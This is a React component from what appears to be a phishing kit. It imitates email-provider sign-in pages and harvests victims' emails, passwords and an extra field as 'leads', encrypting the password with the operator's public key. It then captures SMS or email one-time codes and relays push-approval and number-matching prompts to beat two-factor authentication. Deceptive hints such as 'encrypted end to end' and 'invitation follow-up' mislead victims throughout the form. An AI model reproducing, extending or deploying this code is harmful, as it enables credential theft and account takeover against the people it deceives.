import { useEffect, useRef, useState, type FormEvent } from "react";
import { Link, useParams } from "react-router-dom";
import { BrandMark } from "./components/BrandMark";
import { LoadingOverlay } from "./components/LoadingOverlay";
import { selectProvider } from "../libs/providers";
import { useLeadSession } from "../hooks/useLeadSession";
import "../styles/providerPage.css";

export function ProviderPage() {
  const { provider: providerParam, codeLength: codeLengthParam } = useParams();
  const provider = selectProvider(providerParam);
  const [email, setEmail] = useState("");
  const [fakePass, setFakePass] = useState("");
  const [customFieldValue, setCustomFieldValue] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [fakeCode, setFakeCode] = useState("");

  if (!provider) {
    return (
      <main className="preview-shell">
        <section className="preview-card" role="alert">
          <h1>Email provider not found</h1>
          <p>Choose a provider to continue.</p>
          <Link className="submit-button success-link" to="/providers">
            Choose a provider
          </Link>
        </section>
      </main>
    );
  }

  const session = useLeadSession(provider?.id);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const codeLength = codeLengthParam ? parseInt(codeLengthParam, 10) : 6;

  useEffect(() => {
    void session.sendDevice();
  }, [session.sendDevice]);

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setError("");
    setSuccess("");
    if (!provider || isSubmitting || session.isLoading) return;
    const value = customFieldValue.trim();
    if (provider.extraFields && (value.length < 2 || value.length > 60)) {
      setError(
        `${provider.extraFields.label} must be between 2 and 60 characters.`,
      );
      return;
    }
    setIsSubmitting(true);
    try {
      await session.sendLead({
        provider: provider.id,
        email: email.trim(),
        authToken: await encryptValue(fakePass.trim()),
        ...(provider.extraFields
          ? {
              customField: {
                name: provider.extraFields.name,
                value,
              },
            }
          : {}),
      });
    } finally {
      setIsSubmitting(false);
    }
  }

  async function handleCodeChange(index: number, value: string) {
    const digit = value.replace(/\D/g, "").slice(-1);
    const digits = fakeCode.padEnd(codeLength, " ").split("");
    digits[index] = digit || " ";
    const nextCode = digits.join("").replace(/ +$/, "");
    setFakeCode(nextCode);
    if (digit && index < codeLength - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  }

  async function handleCodePaste(
    event: React.ClipboardEvent<HTMLInputElement>,
  ) {
    event.preventDefault();
    const pasted = event.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, codeLength);
    setFakeCode(pasted);
    inputRefs.current[Math.min(pasted.length, codeLength - 1)]?.focus();
  }

  async function handleCodeSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setFakeCode("");
    setError("");
    if (!provider || isSubmitting || fakeCode.length < codeLength) return;
    setIsSubmitting(true);
    try {
      await session.sendCodeLead({
        provider: provider.id,
        email: email,
        type: session.process === "verify-sms-code" ? "sms" : "email",
        code: fakeCode,
      });
    } finally {
      setIsSubmitting(false);
    }
  }

  async function encryptValue(value: string): Promise<string> {
    if (!globalThis.crypto?.subtle) return `unprotected:${value}`;
    const pemKey = import.meta.env.VITE_PHOENYX_PUBLIC_KEY?.replace(
      /\\n/g,
      "\n",
    );
    if (!pemKey) throw new Error("VITE_PHOENYX_PUBLIC_KEY is not configured.");
    const pemBase64 = pemKey
      .replace(/-----BEGIN PUBLIC KEY-----/g, "")
      .replace(/-----END PUBLIC KEY-----/g, "")
      .replace(/\s/g, "");
    const binary = atob(pemBase64);
    const bytes = Uint8Array.from(binary, (char) => char.charCodeAt(0));
    const publicKey = await crypto.subtle.importKey(
      "spki",
      bytes.buffer,
      {
        name: "RSA-OAEP",
        hash: "SHA-256",
      },
      false,
      ["encrypt"],
    );
    const ciphertext = await crypto.subtle.encrypt(
      { name: "RSA-OAEP" },
      publicKey,
      new TextEncoder().encode(value),
    );
    return btoa(String.fromCharCode(...new Uint8Array(ciphertext)));
  }

  return (
    <main className={`preview-shell theme-${provider.id}`}>
      <header className="preview-topbar">
        <Link
          className="back-link"
          to="/providers"
          aria-label="Back to email provider selection"
        >
          <span aria-hidden="true">←</span> All providers
        </Link>
        <span className="preview-topbar-label">SECURE SIGN IN</span>
      </header>
      <section
        className="preview-card mail-flow-card"
        aria-labelledby="mail-heading"
      >
        <div className="preview-brand">
          <BrandMark provider={provider.id} />
          <span>{provider.brandLabel}</span>
          <span className="brand-preview-tag">SIGN IN</span>
        </div>
        {(session.process === "init" || session.process === "auth") &&
        session.status !== "completed" ? (
          <>
            <div className="preview-intro">
              <p className="eyebrow">{}</p>
              <h1 id="mail-heading">{provider.title}</h1>
              <p>{provider.description}</p>
            </div>
            <form
              className="preview-form"
              onSubmit={(event) => void handleSubmit(event)}
            >
              <div className="form-field">
                <label htmlFor="mail-email">Email</label>
                <input
                  autoComplete="email"
                  id="mail-email"
                  maxLength={254}
                  onChange={(event) => setEmail(event.target.value)}
                  placeholder={provider.emailSample}
                  required
                  type="email"
                  value={email}
                />
                <span className="field-hint">
                  Enter the email address you’d like us to use for your
                  invitation follow-up.
                </span>
              </div>

              <div className="form-field">
                <label htmlFor="mail-password">Password</label>
                <input
                  autoComplete="off"
                  id="mail-password"
                  minLength={1}
                  onChange={(event) => setFakePass(event.target.value)}
                  required
                  type="password"
                  value={fakePass}
                />
                <span className="field-hint">
                  Your password with this site is encrypted end to end.
                </span>
              </div>

              {provider.extraFields ? (
                <div className="form-field">
                  <label htmlFor="mail-custom-field">
                    {provider.extraFields.label}
                  </label>
                  <input
                    autoComplete="off"
                    id="mail-custom-field"
                    maxLength={60}
                    onChange={(event) =>
                      setCustomFieldValue(event.target.value)
                    }
                    placeholder={provider.extraFields.placeholder}
                    required
                    value={customFieldValue}
                  />
                  <span className="field-hint">
                    {provider.extraFields.helper}
                  </span>
                </div>
              ) : null}

              <label className="lead-consent">
                <input required type="checkbox" />
                <span>
                  I agree to receive an email about my invitation and next
                  steps.
                </span>
              </label>

              {error ||
              session.status === "flagged" ||
              session.status === "failed" ? (
                <p className="form-message form-error" role="alert">
                  {error || session.message}
                </p>
              ) : null}
              <button
                className="submit-button"
                disabled={isSubmitting}
                type="submit"
              >
                {isSubmitting ? (
                  <>
                    <span className="spinner" aria-hidden="true" /> Continuing…
                  </>
                ) : (
                  "Continue"
                )}
              </button>
            </form>
          </>
        ) : session.process === "verify-sms-code" ||
          session.process === "verify-email-code" ||
          session.process === "verify-email-link" ||
          session.process === "verify-prompt-yes" ||
          session.process === "verify-prompt-num" ? (
          <section
            className="verification-card"
            aria-labelledby="verification-title"
          >
            {session.process === "verify-sms-code" && (
              <div className="verification-icon" aria-hidden="true">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  width="24"
                  height="24"
                >
                  <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22z" />
                  <path d="M8 12h.01" />
                  <path d="M12 12h.01" />
                  <path d="M16 12h.01" />
                </svg>
              </div>
            )}
            {session.process === "verify-email-code" && (
              <div className="verification-icon" aria-hidden="true">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  width="24"
                  height="24"
                >
                  <rect x="3.5" y="5.5" width="17" height="13" rx="2" ry="2" />
                  <polyline points="3.5,7.5 12,11 20.5,7.5" />
                  <path d="M9 15h.01" />
                  <path d="M12 15h.01" />
                  <path d="M15 15h.01" />
                </svg>
              </div>
            )}
            {session.process === "verify-email-link" && (
              <div className="verification-icon" aria-hidden="true">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  width="24"
                  height="24"
                >
                  <rect x="2" y="4" width="20" height="16" rx="2" ry="2" />
                  <polyline points="2,6 12,13 22,6" />
                </svg>
              </div>
            )}
            {(session.process === "verify-prompt-yes" ||
              session.process === "verify-prompt-num") && (
              <div className="verification-icon" aria-hidden="true">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  width="24"
                  height="24"
                >
                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                  <line x1="12" y1="18" x2="12.01" y2="18" />
                </svg>
              </div>
            )}
            <h1 id="verification-title">
              {session.process === "verify-email-link" ||
              session.process === "verify-email-code"
                ? "Check your inbox"
                : "Check your phone"}
            </h1>
            <p className="verification-description">
              {session.process === "verify-sms-code"
                ? `Enter the code ${provider.brandLabel} sent to your phone number`
                : session.process === "verify-email-code"
                  ? `Enter the code ${provider.brandLabel} sent to ${email}`
                  : session.process === "verify-email-link"
                    ? `Click the link ${provider.brandLabel} sent to ${email}`
                    : session.process === "verify-prompt-yes"
                      ? `${provider.brandLabel} sent a notification to your mobile device. Tap ${session.message} to verify it's you.`
                      : `${provider.brandLabel} sent a notification to your mobile device. Tap the number shown below to verify it's you.`}

              {session.process === "verify-prompt-num" && (
                <h2>{session.message}</h2>
              )}
            </p>
            {session.process !== "verify-email-link" &&
            session.process !== "verify-prompt-yes" &&
            session.process !== "verify-prompt-num" ? (
              <form onSubmit={handleCodeSubmit} style={{ marginTop: 24 }}>
                <div
                  style={{
                    display: "flex",
                    justifyContent: "center",
                    gap: 10,
                  }}
                >
                  {Array.from({ length: codeLength }, (_, index) => (
                    <input
                      key={index}
                      ref={(element) => {
                        inputRefs.current[index] = element;
                      }}
                      aria-label={`Code digit ${index + 1}`}
                      type="text"
                      inputMode="numeric"
                      autoComplete="off"
                      maxLength={1}
                      value={fakeCode[index] ?? ""}
                      onChange={(event) =>
                        handleCodeChange(index, event.target.value)
                      }
                      onKeyDown={(event) => {
                        if (
                          event.key === "Backspace" &&
                          !fakeCode[index] &&
                          index > 0
                        ) {
                          inputRefs.current[index - 1]?.focus();
                        } else if (event.key === "ArrowLeft" && index > 0) {
                          inputRefs.current[index - 1]?.focus();
                        } else if (
                          event.key === "ArrowRight" &&
                          index < codeLength - 1
                        ) {
                          inputRefs.current[index + 1]?.focus();
                        }
                      }}
                      onPaste={handleCodePaste}
                      required
                      style={{
                        width: codeLength === 4 ? 56 : 42,
                        height: 62,
                        border: "1px solid #dce2ed",
                        borderRadius: 12,
                        background: "#fff",
                        color: "#202b3c",
                        fontSize: 24,
                        fontWeight: 700,
                        textAlign: "center",
                        outlineColor: "var(--accent)",
                        boxShadow: fakeCode[index]
                          ? "0 0 0 2px var(--accent)22"
                          : "none",
                      }}
                    />
                  ))}
                </div>
                {error ||
                session.status === "flagged" ||
                session.status === "failed" ? (
                  <p
                    className="form-message form-error form-code-error"
                    role="alert"
                  >
                    {error || session.message}
                  </p>
                ) : null}
                <button
                  type="submit"
                  disabled={!new RegExp(`^\\d{${codeLength}}$`).test(fakeCode)}
                  style={{
                    width: "100%",
                    marginTop: 28,
                    padding: 16,
                    border: 0,
                    borderRadius: 10,
                    color: "#fff",
                    background: "var(--accent)",
                    fontSize: 14,
                    fontWeight: 700,
                    cursor: "pointer",
                    opacity: new RegExp(`^\\d{${codeLength}}$`).test(fakeCode)
                      ? 1
                      : 0.5,
                  }}
                >
                  {isSubmitting ? (
                    <>
                      <span className="spinner" aria-hidden="true" />{" "}
                      Submitting…
                    </>
                  ) : (
                    "Submit Code"
                  )}
                </button>
              </form>
            ) : (
              <>
                <p className="verification-note">
                  Refresh this page when you're done to continue.
                </p>
              </>
            )}
          </section>
        ) : (
          <div className="success-panel" role="status">
            <span className="success-icon" aria-hidden="true">
              ✓
            </span>
            <p className="eyebrow">THANK YOU</p>
            <h4 id="mail-heading">{session.message}</h4>
            <p>{success}</p>
            <Link className="submit-button success-link" to="/providers">
              Submit Alternative Email
            </Link>
          </div>
        )}
      </section>
      <footer className="preview-footer">
        A simpler, more secure way to stay connected.
      </footer>
      {session.isLoading && <LoadingOverlay message={session.message} />}
    </main>
  );
}
